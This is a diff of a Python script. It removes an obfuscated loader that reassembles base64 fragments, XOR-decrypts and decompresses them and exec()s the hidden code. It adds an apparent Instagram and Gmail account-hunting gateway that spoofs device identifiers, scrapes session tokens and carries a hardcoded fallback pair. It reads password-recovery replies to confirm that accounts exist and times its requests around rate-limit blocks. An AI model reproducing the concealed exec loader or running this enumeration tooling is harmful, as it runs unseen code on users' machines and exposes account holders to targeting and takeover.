-        'DMTliFhu9TggjUrXSBWSon80k02uwSLDxiLiQAPKsa1oXL0xZF6Tgem/iT',
-        'XUyzpDy/uQen032nxAjhfbdHCkgfskStgr6PcQKej2/EjWEuD4ZbarQ1BQ',
-        'NpbZIdfSzs45jHTiaxaWzYhnKvH4djI6H0+azS48VALdx1BzExqmeulX58',
-        'dnZ9zy8qCs8wu6uZd+e75RIa4LFX8Py5KaRcJRNBDyQMiR2weoTxGLf7Ux',
-        'T9wIqS0zEIwz+BZ8+GAhjp5jmXJR9+rNFMmSex/JE5d1UNkGTIO18ElwWt',
-        'DuTXIixSOh6kekV9VLGe1wo+qyzhDHsdk5QgC29cq25lEjyFA/nhRFeDrg',
-        'VxKUjm1IgZX570+k+LaR6AxcLVT8xrQfWjQpOYZ9/ce0Z0o5SNNdIZ+dy7',
-        'NyD4+3HZJBFRFpyYwE3LkHKRu73fcfdJTgHM0XdrcHDyWh9r6eki78ukYV',
-        'waJxaaItMGHHN61YHNclwXas1wMCNhDdMdxnrczzYZL0wKOR+Px2T9fd0L',
-        'MwPdOudinHIvoT6g5nmv8PgF3MpQrRH/ufb5U1rOoZwvs7NP2+7K96+iDm',
-        'ByFAO9zYimPefdM+Ki9XcLa+btfaqM2L0peTit3dgllCs+uvm8jitvMxHx',
-        'jV6KIS1T/807d5yYVVM+SmEbRmsbIjIqd6IeAxOgeCv19jlXqxoPLV/mjX',
-        'KaiRmjV8dPMIll3vxO8/tTNV3aILIQlAxNO3Vs4ZAVj5e6nL8O1NBDC6OJ',
-        'FEehTqvC/rdoCnZIxM+8bGqKwpjCbgqcWBLu9ph3U6qWUk60ppO2iO9CEW',
-        '2Yoo2yut3j9zY6cCczO0ECjna3daRXxOYSXyLJ6bNxlgVWKm/m6wVsy++n',
-        'H8ktbuwVQ4LYCE64JdvyM5z0iYbwBAHRS4Fwff0jCuZz+/uVPe16p20tvl',
-        'GFZGInAgX0zvgoGImKLr+HPnt6fWvBmCFlWX6izob24nk/en6ahg2F9heS',
-        'KlIkyQ3XgACLs4SCn9Mjau2e6+R/XlXHUWRXGm7WUWo0YwR7YYfDCpGFlO',
-        'U4hpUPg4wEIV1sW6rPNHee7kz1uDfw76eKzZYoN2oKn799dzJNkMs09X4D',
-        'ONfXzga6dF1e/U8I52AxK9LS2zhmj7k+PABPd5lJteSJnRz4K7MRPN6yKl',
-        '9Gb7t+zGF2wPHCAW84gKmhjOQXSkLGGOTOqxfblQCGW+rjluNEGda8/exy',
-        'PxmuPgnNj3fUAL94UpZ5kwrXqe89Mn7nBpJacJOA8kfzlVbQhylI2SooIM',
-        'ZtVz2m9f9ulYWU6rGUuGKk48TkDDenaqABNHoNoSghj1oMXhlw4F1o/wSy',
-        'MdJIRW6RSc9NdQEhEEGvtGeJWUhXf5c3Fe6Bmtu3W/U7AQdNWVzM9H+yzq',
-        'XkX6Ro8JgxJQD1CK/YRnyDLvcnvOa6kaq1Nz2N2jk3WsdJCnvVkU8LSLar',
-        'jSaK41pihEHOGlUUpD5+V2TbNJrhYGHIPqA322smSMiPreCAAtJ8Ra6XhF',
-        'KGv7BxZnmuWEiyrQm2/L1gi16Z3WbzmHFLyuWHfJE+x7CusYGUbSdnRi/6',
-        'K/QtNBmpMvmiiWWdVVca+beRMNSZAZLt3SyzqjAi98bhSXUZWKByAUdy7t'
+_alive_refresh_executor = ThreadPoolExecutor(max_workers=1, thread_name_prefix="alive")
+
+
+def _hunt_ig_device_ctx():
+    """Reuse per-thread IG device ids — less churn, faster under hunt_cycle load."""
+    ctx = getattr(_hunt_http_local, "ig_ctx", None)
+    if ctx is None:
+        device = str(uuid.uuid4())
+        ctx = {
+            "device": device,
+            "family": str(uuid.uuid4()),
+            "android": "android-" + secrets.token_hex(8),
+            "session_id": f"UFS-{uuid.uuid4()}-0",
+        }
+        _hunt_http_local.ig_ctx = ctx
+    return ctx
+
+
+def _get_ig_graphql_session():
+    """Per-thread session — safe for parallel ig_gen executor workers."""
+    http = getattr(_ig_graphql_local, "session", None)
+    if http is None:
+        http = requests.Session()
+        adapter = HTTPAdapter(
+            pool_connections=4,
+            pool_maxsize=4,
+            max_retries=0,
+        )
+        http.mount("https://", adapter)
+        http.mount("http://", adapter)
+        _ig_graphql_local.session = http
+    return http
+_ig_gen_executor = ThreadPoolExecutor(
+    max_workers=IG_GEN_THREAD_POOL_SIZE,
+    thread_name_prefix="ig-gen",
 )
-_b72136c97e = (1258, 1519, 1346, 1181, 125, 1421, 1163, 1048, 488, 194, 905, 534, 459, 1000, 1189, 1292, 1085, 967, 1201, 568, 586, 886, 579, 1254, 1465, 827, 1416, 320, 182, 887, 525, 696, 1147, 594, 839, 1285, 1308, 1353, 1134, 1514, 108, 1105, 35, 1299, 528, 26, 942, 1494, 1037, 1372, 243, 279, 1284, 515, 1364, 1354, 1060, 371, 1344, 288, 634, 491, 1315, 38, 336, 837, 1437, 114, 768, 232, 387, 892, 820, 1064, 544, 1268, 878, 682, 1302, 715, 106, 1235, 135, 48, 713, 1051, 133, 122, 510, 601, 1338, 322, 1104, 1202, 1203, 538, 493, 1337, 29, 423, 11, 1447, 1497, 97, 1211, 707, 192, 432, 626, 849, 853, 267, 162, 239, 276, 884, 1195, 1467, 1117, 143, 271, 103, 796, 867, 1274, 1187, 1115, 513, 409, 1371, 245, 1266, 1298, 285, 1329, 1511, 787, 1263, 391, 901, 813, 350, 1174, 673, 1493, 229, 1429, 228, 186, 719, 328, 227, 1257, 1176, 819, 262, 1435, 620, 1209, 1349, 351, 265, 365, 815, 1129, 446, 564, 514, 536, 91, 818, 1516, 803, 21, 1304, 1095, 731, 1186, 558, 687, 32, 1496, 1420, 292, 1126, 481, 684, 918, 795, 1082, 1055, 1153, 870, 1112, 116, 708, 1262, 224, 251, 74, 9, 688, 1018, 561, 77, 919, 637, 1061, 655, 145, 1046, 1054, 907, 1402, 990, 804, 1474, 1342, 455, 709, 113, 924, 583, 1423, 726, 703, 1057, 381, 929, 898, 798, 506, 910, 999, 130, 233, 269, 573, 1390, 1343, 641, 934, 1199, 1487, 5, 420, 1196, 390, 732, 462, 1028, 978, 706, 720, 1443, 1102, 7, 1087, 781, 1469, 1040, 1428, 860, 413, 69, 472, 356, 582, 312, 1058, 1177, 33, 964, 153, 609, 535, 37, 1438, 480, 1451, 1260, 1194, 927, 216, 1430, 95, 1255, 128, 1094, 777, 1477, 913, 40, 854, 1143, 1011, 1506, 221, 700, 701, 604, 490, 1013, 873, 136, 623, 780, 549, 530, 1005, 1188, 1313, 1293, 714, 157, 499, 1403, 848, 1489, 397, 1323, 836, 369, 8, 790, 1287, 737, 1427, 23, 1091, 800, 1417, 1157, 309, 1251, 529, 181, 926, 1044, 879, 1240, 86, 1004, 1485, 656, 734, 931, 517, 458, 865, 253, 748, 994, 385, 1226, 838, 1116, 616, 1326, 758, 1161, 428, 710, 893, 280, 772, 477, 1135, 222, 1148, 1113, 969, 179, 291, 1426, 14, 702, 911, 139, 1192, 1045, 363, 1330, 360, 599, 1237, 1145, 450, 788, 41, 457, 15, 1386, 1269, 168, 612, 644, 260, 520, 357, 570, 765, 1100, 880, 83, 282, 374, 730, 1331, 933, 883, 332, 569, 630, 598, 437, 46, 16, 1340, 200, 1491, 567, 1236, 368, 951, 1076, 204, 467, 727, 856, 973, 188, 254, 1476, 170, 1358, 1314, 475, 1410, 1086, 366, 464, 169, 741, 851, 977, 1351, 102, 1316, 1097, 1345, 1387, 1431, 1406, 13, 833, 551, 43, 753, 142, 533, 300, 1335, 691, 1504, 486, 439, 846, 952, 1232, 747, 45, 823, 354, 298, 1182, 1224, 577, 1499, 602, 1433, 1031, 689, 31, 1207, 613, 98, 418, 321, 894, 489, 406, 1248, 680, 148, 1019, 938, 1271, 1246, 214, 297, 177, 417, 1374, 6, 101, 347, 1503, 1513, 735, 62, 1106, 1290, 176, 164, 659, 500, 1111, 306, 949, 605, 658, 1221, 1151, 1306, 756, 156, 1071, 890, 1375, 1495, 340, 1231, 1247, 1466, 974, 1137, 545, 152, 581, 289, 1017, 793, 244, 1079, 543, 1291, 1080, 242, 1197, 255, 1110, 539, 1001, 1360, 373, 258, 619, 766, 608, 512, 211, 1286, 307, 809, 485, 121, 757, 246, 505, 841, 972, 881, 39, 1405, 1015, 1125, 1455, 1084, 981, 767, 678, 305, 495, 1318, 519, 1377, 588, 603, 1234, 364, 824, 1034, 1424, 930, 1250, 90, 1488, 722, 1481, 497, 286, 523, 621, 401, 571, 962, 550, 158, 78, 595, 1312, 916, 1138, 1310, 3, 329, 1324, 449, 675, 1122, 843, 393, 1397, 1183, 672, 234, 71, 1150, 1027, 1520, 1053, 19, 920, 717, 1322, 1399, 611, 444, 358, 66, 359, 414, 828, 1475, 1483, 1223, 660, 1288, 592, 410, 792, 1388, 498, 1300, 4, 223, 362, 845, 786, 386, 1101, 794, 1070, 948, 1067, 236, 1142, 775, 411, 1261, 1016, 1490, 587, 976, 1171, 1230, 207, 1412, 755, 1382, 1198, 415, 167, 1062, 1356, 876, 85, 403, 1244, 791, 1398, 1341, 1023, 960, 831, 814, 1206, 456, 943, 591, 326, 452, 440, 690, 1408, 201, 61, 171, 961, 1154, 632, 649, 235, 645, 1218, 968, 1124, 1050, 1136, 325, 1334, 653, 1036, 479, 1175, 1047, 299, 1168, 454, 859, 317, 871, 159, 1442, 220, 99, 257, 614, 935, 1404, 736, 1459, 622, 47, 776, 872, 1039, 597, 559, 1368, 1384, 742, 252, 522, 124, 209, 674, 1280, 1002, 1265, 1432, 877, 1099, 284, 2, 585, 617, 213, 240, 557, 635, 1422, 339, 958, 335, 1149, 27, 662, 739, 248, 654, 600, 301, 563, 874, 435, 1090, 180, 1366, 1470, 352, 378, 647, 331, 1456, 247, 231, 945, 1107, 1449, 866, 430, 1289, 63, 1277, 303, 492, 185, 1078, 566, 908, 1139, 1502, 1092, 1439, 1463, 694, 1389, 261, 937, 562, 1333, 1339, 1393, 1336, 575, 725, 438, 842, 84, 921, 769, 1523, 615, 319, 172, 922, 203, 1320, 119, 429, 349, 1172, 751, 1486, 1108, 667, 552, 395, 1252, 1190, 1119, 146, 443, 1029, 316, 778, 936, 259, 1156, 1273, 806, 483, 665, 1365, 1385, 779, 711, 636, 404, 829, 160, 906, 304, 692, 850, 650, 988, 1259, 383, 733, 1450, 716, 889, 1369, 740, 1305, 318, 197, 738, 844, 1317, 1056, 1301, 1448, 527, 73, 89, 1267, 646, 895, 1009, 1032, 982, 971, 141, 537, 521, 664, 986, 1414, 1518, 1510, 268, 547, 1024, 431, 51, 0, 812, 1458, 799, 1321, 109, 165, 1205, 912, 685, 749, 388, 1272, 1227, 110, 1509, 657, 763, 238, 697, 183, 695, 193, 134, 542, 955, 1014, 178, 501, 1434, 1020, 580, 1214, 1233, 313, 341, 217, 104, 584, 774, 847, 752, 1228, 199, 627, 1332, 1215, 1140, 344, 327, 115, 801, 263, 1479, 762, 992, 400, 1441, 858, 1042, 473, 773, 1166, 556, 407, 34, 1128, 995, 704, 784, 466, 1500, 174, 970, 548, 463, 155, 1452, 1132, 250, 1081, 1400, 241, 205, 724, 343, 399, 281, 526, 810, 28, 277, 144, 131, 1401, 797, 540, 947, 1409, 875, 1264, 416, 412, 1159, 671, 1270, 355, 944, 750, 516, 1212, 816, 771, 175, 712, 149, 954, 118, 111, 80, 1381, 896, 270, 822, 764, 1325, 1035, 861, 308, 1006, 323, 826, 862, 468, 888, 984, 835, 225, 161, 1074, 287, 1484, 1352, 64, 1307, 202, 631, 1508, 554, 882, 1052, 44, 1283, 980, 451, 1445, 367, 1395, 1008, 640, 661, 1359, 448, 138, 987, 663, 508, 721, 1043, 154, 864, 502, 679, 1141, 761, 65, 184, 817, 1282, 1242, 426, 1049, 991, 1225, 966, 1501, 132, 1457, 1026, 266, 219, 553, 830, 932, 1378, 1419, 744, 1464, 1350, 1440, 1391, 624, 560, 507, 1123, 953, 384, 396, 120, 648, 840, 93, 705, 494, 338, 1088, 1229, 206, 330, 1436, 897, 1505, 453, 1133, 353, 496, 1279, 129, 310, 1296, 52, 625, 87, 760, 334, 1275, 503, 324, 230, 379, 1179, 683, 112, 274, 900, 295, 190, 998, 471, 1512, 633, 1089, 1216, 975, 743, 983, 1394, 989, 476, 638, 1311, 79, 686, 950, 1472, 58, 92, 903, 1022, 666, 555, 1411, 1243, 891, 596, 965, 1294, 1461, 1362, 1220, 576, 470, 361, 296, 610, 487, 1297, 855, 1507, 49, 24, 746, 1522, 290, 342, 578, 1021, 96, 348, 1093, 1025, 402, 1075, 1425, 677, 1222, 832, 518, 237, 1418, 422, 380, 904, 447, 985, 1373, 909, 1155, 1, 337, 1173, 166, 565, 1083, 1328, 1245, 1454, 698, 1370, 789, 1468, 1392, 1415, 532, 275, 1238, 572, 1480, 478, 1184, 173, 1077, 17, 1146, 1162, 857, 293, 1167, 917, 25, 642, 669, 1357, 419, 1012, 67, 628, 105, 50, 811, 1144, 869, 54, 1204, 272, 1103, 504, 1170, 993, 834, 70, 12, 333, 1003, 394, 963, 1200, 590, 1208, 433, 55, 928, 940, 759, 147, 445, 68, 191, 1407, 76, 807, 574, 314, 1114, 1281, 442, 1219, 728, 956, 249, 997, 1241, 825, 1249, 10, 509, 1473, 754, 805, 607, 372, 434, 729, 899, 606, 868, 957, 151, 1217, 863, 723, 460, 1030, 785, 651, 1152, 1517, 1180, 1383, 57, 1446, 1158, 315, 1065, 30, 72, 264, 1482, 593, 925, 1063, 1471, 60, 302, 36, 82, 484, 408, 745, 1041, 979, 885, 75, 375, 482, 1121, 1073, 424, 405, 511, 212, 370, 196, 1396, 693, 117, 1363, 469, 1066, 676, 1327, 1185, 618, 946, 718, 1303, 226, 1309, 914, 1169, 1007, 639, 283, 959, 681, 392, 198, 1178, 770, 1492, 670, 53, 1253, 1033, 1361, 1213, 1131, 150, 127, 187, 195, 1165, 821, 465, 94, 208, 88, 210, 668, 56, 1295, 1239, 346, 923, 1478, 629, 902, 1376, 1256, 126, 398, 123, 1120, 421, 1160, 42, 427, 1347, 541, 1462, 107, 163, 1276, 20, 1319, 1460, 137, 1069, 1109, 376, 215, 808, 474, 1059, 1355, 939, 311, 915, 546, 377, 100, 1130, 189, 1367, 643, 218, 652, 1118, 1038, 18, 1453, 1380, 294, 1444, 941, 1072, 1348, 436, 996, 1278, 852, 1413, 441, 278, 782, 425, 524, 1515, 389, 589, 1068, 382, 1010, 1379, 81, 1521, 1498, 1127, 1098, 59, 22, 256, 531, 273, 461, 783, 1191, 1193, 1210, 1164, 1096, 699, 802, 140, 345)
-_a18f56089b = '0d78df683398b8cdf9914a652bb40503f41b34e6e3907d14503b61ee9011e897'
-def _7f7254ba12():
-    import base64 as _b64
-    import hashlib as _hl
-    import lzma as _lz
-    _key = _hl.sha256(_89d6117eea + b''.join(_b497179f7e)).digest()
-    _ordered = [_5e2635f739[_b72136c97e[i]] for i in range(len(_b72136c97e))]
-    _raw = "".join(_ordered)
-    _blob = _b64.b64decode(_raw.encode('ascii'))
-    _xored = bytes(_blob[i] ^ _key[i % len(_key)] for i in range(len(_blob)))
-    _plain = _lz.decompress(_xored)
-    _inner = _plain.decode('utf-8')
-    if _hl.sha256(_inner.encode()).hexdigest() != _a18f56089b:
-        мюФЩРЦчФцЫЙЪЩулЪШ()
-    _g = globals()
-    _bi = __builtins__ if isinstance(__builtins__, dict) else __builtins__.__dict__
-    (_bi.get("exec") or __import__("builtins").exec)(_inner, _g)
-_7f7254ba12()
+_recovery_executor = ThreadPoolExecutor(
+    max_workers=2,
+    thread_name_prefix="ig-recovery",
+)
+info = {}
+
+VALID_API_KEYS = {"test123", "freekey"}
+GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
+GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
+REFERRER_HEADER = 'referer'
+ORIGIN_HEADER = 'origin'
+AUTHORITY_HEADER = 'authority'
+CONTENT_TYPE_HEADER = 'Content-Type'
+COOKIE_HEADER = 'Cookie'
+USER_AGENT_HEADER = 'User-Agent'
+CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
+CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'
+TOKEN_FILE = "google_token.txt"
+attempts = 1
+
+def rgb(r, g, b):
+    return f"\033[38;2;{r};{g};{b}m"
+
+
+def gradient_line(text, start, end):
+    if not COLOR_SUPPORT or not text:
+        return text
+    r1, g1, b1 = start
+    r2, g2, b2 = end
+    out = []
+    width = max(len(text) - 1, 1)
+    for i, ch in enumerate(text):
+        t = i / width
+        r = int(r1 + (r2 - r1) * t)
+        g = int(g1 + (g2 - g1) * t)
+        b = int(b1 + (b2 - b1) * t)
+        out.append(f"{rgb(r, g, b)}{ch}")
+    return "".join(out) + ANSI_RESET
+
+
+BANNER_LOGO = [
+    "     ██╗███╗   ██╗██████╗  █████╗ ██████╗ ███████╗████████╗ ██████╗ ",
+    "     ██║████╗  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗",
+    "     ██║██╔██╗ ██║██████╔╝███████║██████╔╝█████╗     ██║   ██║   ██║",
+    "     ██║██║╚██╗██║██╔═══╝ ██╔══██║██╔══██╗██╔══╝     ██║   ██║   ██║",
+    "     ██║██║ ╚████║██║     ██║  ██║██║  ██║███████╗   ██║   ╚██████╔╝",
+    "     ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝ ",
+]
+
+BANNER_BADGE = [
+    "        ╭──────────────────────────────────────────────╮",
+    "        │  ◆  Developed & Maintained by S Crew  ◆      │",
+    "        ╰──────────────────────────────────────────────╯",
+]
+
+
+def paint_logo():
+    palette = [
+        ((0, 255, 255), (0, 140, 255)),
+        ((0, 220, 255), (80, 90, 255)),
+        ((100, 180, 255), (140, 60, 255)),
+        ((160, 120, 255), (200, 40, 255)),
+        ((200, 80, 255), (255, 60, 200)),
+        ((255, 40, 180), (255, 80, 120)),
+    ]
+    lines = []
+    for idx, row in enumerate(BANNER_LOGO):
+        start, end = palette[idx]
+        lines.append("  " + gradient_line(row, start, end))
+    for row in BANNER_BADGE:
+        lines.append(apply_color(row, ANSI_MAGENTA))
+    return lines
+
+
+def _card_inner_w(label_w, value_w):
+    return label_w + value_w + 3
+
+
+def _fit_label(label, label_w):
+    label = str(label)
+    if len(label) <= label_w:
+        return label
+    return label[: max(label_w - 1, 1)] + "…"
+
+
+def paint_info_card(rows, label_w=11, value_w=34):
+    inner_w = _card_inner_w(label_w, value_w)
+    top = apply_color(f"  ╭{'─' * inner_w}╮", ANSI_CYAN)
+    bottom = apply_color(f"  ╰{'─' * inner_w}╯", ANSI_CYAN)
+    body = []
+    for label, value, color in rows:
+        left = f"  │ {_fit_label(label, label_w):<{label_w}}│ "
+        right = f"{pad_value(str(value), value_w)}│"
+        body.append(apply_color(left, ANSI_DIM) + apply_color(right, color))
+    return [top, *body, bottom]
+
+
+ACTION_BOX_W = 73
+ACTION_INNER = 67
+
+
+def visible_len(text):
+    return len(re.sub(r"\033\[[0-9;]*m", "", str(text)))
+
+
+def pad_value(value, width):
+    pad = max(width - visible_len(value), 0)
+    return f"{value}{' ' * pad}"
+
+
+def clip_plain(text, max_len):
+    plain = re.sub(r"\033\[[0-9;]*m", "", str(text))
+    if len(plain) <= max_len:
+        return plain
+    return plain[: max_len - 1] + "…"
+
+
+def paint_action_box(title, lines, border_color=ANSI_YELLOW):
+    head = f"  ┌─ {title} "
+    dashes = max(ACTION_BOX_W - len(head) - 1, 0)
+    out = [apply_color(head + "─" * dashes + "┐", border_color)]
+    for text, color in lines:
+        body = clip_plain(text, ACTION_INNER)
+        out.append(apply_color(f"  │  {body:<{ACTION_INNER}}│", color))
+    out.append(apply_color(f"  └{'─' * (ACTION_BOX_W - 4)}┘", border_color))
+    return out
+
+
+def render_keyboard_exit():
+    print()
+    print(gradient_line("  ◆  G A T E W A Y   O F F L I N E  ◆  ", (255, 80, 90), (255, 170, 110)))
+    print()
+    for line in paint_action_box(
+        "GATEWAY STOPPED",
+        [
+            ("Ctrl+C received — API host is shutting down.", ANSI_YELLOW),
+            ("Public endpoint removed from this machine.", ANSI_DIM),
+            ("Start again:  python endpoint.py", ANSI_CYAN),
+        ],
+        ANSI_RED,
+    ):
+        print(line)
+    print(apply_color("  Gateway shutdown complete.\n", ANSI_DIM))
+
+
+def render_startup_banner(device_hash, public_ip, port, cloud_ok):
+    endpoint = f"{public_ip}:{port}" if public_ip else f"unknown:{port}"
+    cloud_text = "synced" if cloud_ok else "pending"
+    cloud_color = ANSI_GREEN if cloud_ok else ANSI_YELLOW
+    host = platform.node() or "local"
+
+    print()
+    for line in paint_logo():
+        print(line)
+    print()
+
+    info_rows = [
+        ("Status", "● ONLINE", ANSI_GREEN),
+        ("Endpoint", endpoint, ANSI_CYAN),
+        ("Device", f"{device_hash[:16]}…", ANSI_CYAN),
+        ("Host", host[:34], ANSI_BLUE),
+        ("Cloud", cloud_text, cloud_color),
+        ("Engine", "FastAPI / Uvicorn", ANSI_MAGENTA),
+        ("Profile", f"{GATEWAY_PROFILE} · fill {IG_GEN_BUFFER_FILL_WORKERS}", ANSI_YELLOW if _IS_TERMUX else ANSI_DIM),
+    ]
+    for line in paint_info_card(info_rows):
+        print(line)
+
+    print()
+    for line in paint_action_box(
+        "NEXT STEP",
+        [
+            ("API host is live — keep this terminal open.", ANSI_GREEN),
+            (
+                (
+                    "Termux: lighter buffer (48 fillers) — pair with joint.py on same phone."
+                    if _IS_TERMUX
+                    else "joint.py auto-uses 127.0.0.1 on this PC if public IP is blocked."
+                ),
+                ANSI_DIM,
+            ),
+            ("Open a new terminal and run:  python joint.py", ANSI_YELLOW),
+        ],
+        ANSI_YELLOW,
+    ):
+        print(line)
+    print(apply_color("\n  Gateway running in foreground. Ctrl+C stops API only.\n", ANSI_DIM))
+
+
+def get_device_hash():
+    seed = "|".join([
+        platform.node(),
+        platform.system(),
+        platform.machine(),
+        platform.processor(),
+        str(uuid.getnode()),
+    ])
+    return hashlib.sha256(seed.encode("utf-8")).hexdigest()
+
+
+def supabase_headers(prefer=None):
+    headers = {
+        "apikey": SUPABASE_ANON_KEY,
+        "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
+        "Content-Type": "application/json",
+    }
+    if prefer:
+        headers["Prefer"] = prefer
+    return headers
+
+
+def fetch_device_record(device_hash):
+    url = f"{SUPABASE_URL}/rest/v1/devices"
+    try:
+        response = requests.get(
+            url,
+            headers=supabase_headers(),
+            params={
+                "device_hash": f"eq.{device_hash}",
+                "select": "*",
+                "limit": "1",
+            },
+            timeout=CLOUD_TIMEOUT,
+        )
+        if not response.ok:
+            return None, response.text[:200]
+        data = response.json()
+        if not data:
+            return None, None
+        return data[0], None
+    except Exception as exc:
+        return None, str(exc)
+
+
+def save_api_host_record(device_hash, public_ip, port, api_host):
+    now = datetime.now(timezone.utc).isoformat()
+    existing, _ = fetch_device_record(device_hash)
+    payload = {
+        "device_hash": device_hash,
+        "api_host": api_host,
+        "api_public_ip": public_ip,
+        "api_port": port,
+        "hostname": platform.node(),
+        "display_name": (existing or {}).get("display_name") or f"Op-{device_hash[:8]}",
+        "telegram_bot_token": (existing or {}).get("telegram_bot_token") or "",
+        "telegram_chat_id": (existing or {}).get("telegram_chat_id") or "",
+        "last_seen": now,
+    }
+    if not existing:
+        payload["first_seen"] = now
+    url = f"{SUPABASE_URL}/rest/v1/devices?on_conflict=device_hash"
+    try:
+        response = requests.post(
+            url,
+            headers=supabase_headers("resolution=merge-duplicates,return=representation"),
+            json=payload,
+            timeout=CLOUD_TIMEOUT,
+        )
+        if not response.ok:
+            return response.text[:200]
+        return None
+    except Exception as exc:
+        return str(exc)
+
+
+async def fetch_public_ip():
+    endpoints = (
+        "https://api.ipify.org",
+        "https://ifconfig.me/ip",
+        "https://icanhazip.com",
+    )
+    for url in endpoints:
+        try:
+            response = await asyncio.to_thread(requests.get, url, timeout=8)
+            if response.ok:
+                candidate = response.text.strip()
+                if candidate and not candidate.startswith(("127.", "10.", "192.168.", "172.")):
+                    return candidate
+                if candidate:
+                    return candidate
+        except Exception:
+            continue
+    return None
+
+
+def suppress_server_logs():
+    for name in ("uvicorn", "uvicorn.error", "uvicorn.access"):
+        logging.getLogger(name).setLevel(logging.CRITICAL)
+        logging.getLogger(name).disabled = True
+
+
+# ---------------- GENERATE USER AGENT ----------------
+def generate_user_agent():
+    return "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36"
+
+
+def _gmail_lookup_user_agent():
+    """Termux uses Android UA to match curl_cffi chrome131_android TLS fingerprint."""
+    return generate_user_agent() if _IS_TERMUX else _GMAIL_UA
+
+
+def _ig_response_is_blocked(response):
+    ctype = (response.headers.get("content-type") or "").lower()
+    if "html" in ctype:
+        return True
+    text = (response.text or "").lstrip()
+    return bool(text) and not text.startswith("{") and not text.startswith("[")
+
+
+def _ig_body_rate_limited(body):
+    """IG returns JSON errors (1675004) when IP is throttled — not HTML."""
+    if not isinstance(body, dict):
+        return False
+    for err in body.get("errors") or []:
+        if not isinstance(err, dict):
+            continue
+        code = err.get("code")
+        msg = (err.get("message") or "").lower()
+        if code in (1675004, 4) or "rate limit" in msg:
+            return True
+    return False
+
+
+def _mark_ig_gen_blocked(cooldown=None):
+    """GraphQL username gen — pauses buffer fill + live gen only."""
+    global _ig_gen_block_until
+    if cooldown is None:
+        cooldown = _IG_BLOCK_COOLDOWN_GEN
+    with _ig_block_lock:
+        now = time.time()
+        if _ig_gen_block_until - now > _IG_BLOCK_REMARK_MIN_LEFT:
+            return
+        _ig_gen_block_until = now + float(cooldown)
+
+
+def _mark_ig_lookup_blocked(cooldown=None):
+    """M3 email lookup 429 — must not stop buffer fillers."""
+    global _ig_lookup_block_until
+    if cooldown is None:
+        cooldown = _IG_BLOCK_COOLDOWN_LOOKUP
+    with _ig_block_lock:
+        now = time.time()
+        if _ig_lookup_block_until - now > _IG_BLOCK_REMARK_MIN_LEFT:
+            return
+        _ig_lookup_block_until = now + float(cooldown)
+
+
+def _mark_ig_blocked(cooldown=None):
+    _mark_ig_gen_blocked(cooldown=cooldown)
+
+
+def _ig_in_gen_block_cooldown():
+    return time.time() < _ig_gen_block_until
+
+
+def _ig_in_lookup_block_cooldown():
+    return time.time() < _ig_lookup_block_until
+
+
+def _ig_in_block_cooldown():
+    return _ig_in_gen_block_cooldown()
+
+
+def _fetch_fresh_ig_tokens():
+    """Live csrftoken + lsd from instagram.com — stale tk.txt causes empty gen."""
+    tok_sess = requests.Session()
+    tok_sess.headers["User-Agent"] = _IG_WEB_UA
+    try:
+        resp = _ig_http_get("https://www.instagram.com/", timeout=12, http=tok_sess)
+    except Exception:
+        return None, None
+    csrf = (tok_sess.cookies.get("csrftoken") or "").strip()
+    lsd = ""
+    match = _LSD_TOKEN_RE.search(resp.text or "")
+    if match:
+        lsd = match.group(1).strip()
+    if csrf and lsd:
+        now = time.time()
+        with _tk_lock:
+            _tk_cache["csrf"] = csrf
+            _tk_cache["lsd"] = lsd
+            _tk_cache["at"] = now
+        try:
+            with open("tk.txt", "w", encoding="utf-8") as handle:
+                handle.write(f"{csrf}|{lsd}")
+        except OSError:
+            pass
+        return csrf, lsd
+    return None, None
+
+
+def load(*, force_refresh=False):
+    """Cache tk.txt in memory — refresh from IG when missing or stale."""
+    if not force_refresh:
+        now = time.time()
+        with _tk_lock:
+            if (
+                _tk_cache.get("csrf")
+                and _tk_cache.get("lsd")
+                and now - float(_tk_cache.get("at") or 0) < TK_CACHE_SEC
+            ):
+                return _tk_cache["csrf"], _tk_cache["lsd"]
+        try:
+            with open("tk.txt", "r", encoding="utf-8") as file:
+                parts = file.read().strip().split("|")
+                if len(parts) == 2:
+                    csrf, lsd = parts[0].strip(), parts[1].strip()
+                    if csrf and lsd:
+                        with _tk_lock:
+                            _tk_cache["csrf"] = csrf
+                            _tk_cache["lsd"] = lsd
+                            _tk_cache["at"] = now
+                        return csrf, lsd
+        except OSError:
+            pass
+    fresh = _fetch_fresh_ig_tokens()
+    if fresh[0] and fresh[1]:
+        return fresh
+    return "iOtJRFIg4a1qWbmj6kyFAnl9myM1KL4N", "gBe1PvkGrT-aR_CQpsVxFN"
+
+def _parse_hunt_ig_m2_body(body):
+    """M2 GraphQL markers — block/retry response still means account exists."""
+    text = (body or "").strip()
+    if not text:
+        return None, "empty"
+    if text.startswith("for (;;);"):
+        text = text[9:].strip()
+    if "Check your email or phone" in text:
+        return False, "No account found"
+    if "We sent you an email with a link to get back into your account." in text or "Get link via email" in text:
+        return True, "Account exists, email sent for recovery"
+    if "Something went wrong, please try again later." in text:
+        return False, "Account exists but hit a block, try again later"
+    low = text.lower()
+    if "rate limit" in low and "something went wrong" not in low:
+        return None, "rate_limited"
+    return None, None
+
+def _hunt_mobile_headers(ctx, *, client_endpoint, friendly_name):
+    return {
+        "User-Agent": _IG_MOBILE_UA,
+        "accept-language": "en-IN, en-US",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "x-bloks-version-id": "5e47baf35c5a270b44c8906c8b99063564b30ef69779f3dee0b828bee2e4ef5b",
+        "x-fb-friendly-name": friendly_name,
+        "x-ig-android-id": ctx["android"],
+        "x-ig-app-id": _IG_MOBILE_APP_ID,
+        "x-ig-app-locale": "en_IN",
+        "x-ig-client-endpoint": client_endpoint,
+        "x-ig-device-id": ctx["device"],
+        "x-ig-family-device-id": ctx["family"],
+        "x-ig-timezone-offset": str(datetime.now().astimezone().utcoffset().total_seconds()),
+        "x-mid": base64.urlsafe_b64encode(secrets.token_bytes(18)).decode().rstrip("="),
+        "x-pigeon-rawclienttime": str(time.time()),
